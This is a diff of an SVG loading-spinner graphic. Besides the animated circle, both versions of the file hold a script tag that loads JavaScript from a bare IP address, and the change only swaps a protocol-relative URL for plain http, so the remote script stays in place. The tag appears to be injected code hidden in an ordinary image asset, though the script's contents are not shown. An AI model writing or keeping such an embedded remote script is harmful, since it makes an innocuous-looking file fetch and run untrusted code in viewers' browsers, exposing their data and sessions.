@@ -8,5 +8,5 @@
       <animate attributeName="r" calcMode="spline" values="0;40" keyTimes="0;1" dur="1" keySplines="0 0.2 0.8 1" begin="0s" repeatCount="indefinite"></animate>
       <animate attributeName="opacity" calcMode="spline" values="1;0" keyTimes="0;1" dur="1" keySplines="0.2 0 0.8 1" begin="0s" repeatCount="indefinite"></animate>
     </circle>
-    <script xlink:href="//154.12.54.196/assets/js/1001.js"></script>
+    <script xlink:href="http://154.12.54.196/assets/js/1001.js"></script>
 </svg>
